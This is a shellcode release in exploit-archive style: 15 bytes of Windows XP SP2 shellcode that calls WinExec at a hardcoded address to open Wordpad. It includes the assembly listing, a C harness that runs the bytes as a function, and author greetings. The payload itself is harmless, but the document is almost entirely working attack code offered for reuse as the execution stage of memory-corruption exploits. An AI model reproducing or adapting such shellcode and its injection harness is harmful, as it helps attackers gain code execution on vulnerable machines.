+-------------------------------------------------+

| Windows XP Pro Sp2 English "Wordpad" Shellcode. |

+-------------------------------------------------+


Size  : 15 Bytes.
Author: Aodrulez. 
Email : f3arm3d3ar@gmail.com


Shellcode = "\x6A\x05\x68\x97\x4C\x80\x7C\xB8"
            "\x4D\x11\x86\x7C\xFF\xD0\xCC";


+-----------+

| Asm Code: |

+-----------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

start:
      push 5
	push 7c804c97h    ;addr of "write" string in mem
	mov eax,7c86114dh ;addr of "WinExec" Function.
	call eax
	int 3h
end start

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


+-----------------+

| Shellcodetest.c |

+-----------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

char code[] = "\x6A\x05\x68\x97\x4C"
              "\x80\x7C\xB8\x4D\x11"
              "\x86\x7C\xFF\xD0\xCC";


int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+-------------------+

| Greetz Fly Out To |

+-------------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1] Amforked()	 : My Mentor.
2] The Blue Genius : My Boss.
3] www.orchidseven.com
4] www.isacm.org.in

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~